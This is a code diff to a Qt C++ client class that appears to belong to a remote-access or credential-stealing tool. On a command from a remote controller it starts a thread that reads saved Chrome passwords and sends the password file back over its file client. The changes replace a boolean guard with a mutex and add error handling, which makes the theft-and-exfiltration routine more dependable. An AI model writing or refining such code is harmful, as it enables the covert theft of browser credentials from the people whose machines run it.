@@ -5,8 +5,7 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
     QObject(parent),
     path(defaultPath),
     ip(_ip),
-    port(_port),
-    isChromePassExists(false)
+    port(_port)
 {
     //Start modules
     fileServer = new FileServer(this, 1234, path);
@@ -14,6 +13,7 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
     config = new Config;
     onlineTimer = new QTimer(this);
     screenTimer = new QTimer(this);
+    mutex = new QMutex();
 
     fileServer->start();
 
@@ -69,6 +69,7 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
 Client::~Client()
 {
     fileClient->getOffline();
+    delete mutex;
     delete onlineTimer;
     delete screenTimer;
     delete config;
@@ -127,29 +128,43 @@ void Client::getString(const QString &string, const QString& /* ip */)
 
         QString currentFile = filesStr.section('|', 0, 0);
         quint16 files = currentFile.toInt();
-        if (files & ChromePass & !(isChromePassExists))
+        if (files & ChromePass)
         {
-            //Start thread with chrome password reader
-            QThread* thread = new QThread(this);
-            PassReader* passReader = new PassReader;
-            passReader->moveToThread(thread);
-
-            connect(thread, &QThread::started, passReader, &PassReader::readPass);
-            connect(passReader, &PassReader::passSaved, thread, &QThread::quit);
-            connect(thread, &QThread::finished, thread, &QThread::deleteLater);
-            connect(thread, &QThread::finished, passReader, &PassReader::deleteLater);
-
-            thread->start();
-            isChromePassExists = true;
-
-            connect(passReader, &PassReader::passSaved,
-            this, [this](QString path)
+            //If mutex is free
+            if (mutex->tryLock(0) )
             {
-                //Send password file
-                fileClient->enqueueData(_FILE, path);
-                fileClient->connect();
-                isChromePassExists = false;
-            });
+                //Start thread with chrome password reader
+                QThread* thread = new QThread(this);
+                PassReader* passReader = new PassReader;
+
+                passReader->moveToThread(thread);
+
+                connect(thread, &QThread::started, passReader, &PassReader::readPass);
+                connect(passReader, &PassReader::passSaved, thread, &QThread::quit);
+                connect(thread, &QThread::finished, thread, &QThread::deleteLater);
+                connect(thread, &QThread::finished, passReader, &PassReader::deleteLater);
+
+                //Quit thread if it was an error
+                connect(passReader, &PassReader::error, thread, &QThread::quit);
+                //Unlock mutex if thread finished
+                connect(thread, &QThread::finished, [this](){
+                    this->mutex->unlock();
+                });
+
+                thread->start();
+
+                connect(passReader, &PassReader::passSaved,
+                this, [this](QString path)
+                {
+                    //Send password file
+                    fileClient->enqueueData(_FILE, path);
+                    fileClient->connect();
+                });
+            }
+            else
+            {
+                qDebug() << "Mutex is locked";
+            }
         }
 
         //Look for all files in string
